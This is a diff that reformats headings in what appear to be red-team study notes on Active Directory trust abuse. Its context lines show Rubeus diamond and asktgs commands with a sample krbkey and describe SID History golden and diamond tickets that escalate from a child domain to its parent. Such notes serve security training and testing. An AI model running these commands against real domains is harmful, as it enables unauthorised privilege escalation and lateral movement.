@@ -15,7 +15,7 @@ things to look at:
 
 DA privs in the child means DA privs in the parent using a TGT with the SID History attribute
 
-**Golden Ticket with SID History**
+## Golden Ticket with SID History
 
 need target groups SID
 ```
@@ -38,7 +38,7 @@ now we can interact with the parent domains stuff
 ls \\<parent domains dc>\c$
 ```
 
-**Diamond Ticket with SID History**
+## Diamond Ticket with SID History
 
 the diamond flag let's use specify additional sids to add
 
@@ -46,7 +46,7 @@ the diamond flag let's use specify additional sids to add
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:<target groups sid> /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
 ```
 
-### One-Way Inbound
+## One-Way Inbound
 
 if you have an Inbound trust in the TrustDirection from below
 ```
@@ -78,7 +78,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:k
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/<target domain dc> /domain:<target domain> /dc:<target dc> /ticket:<base64> /nowrap
 ```
 
-### One-Way Outbound
+## One-Way Outbound
 
 this means the other domain has trust in the current domain, but not the other way around
 ```
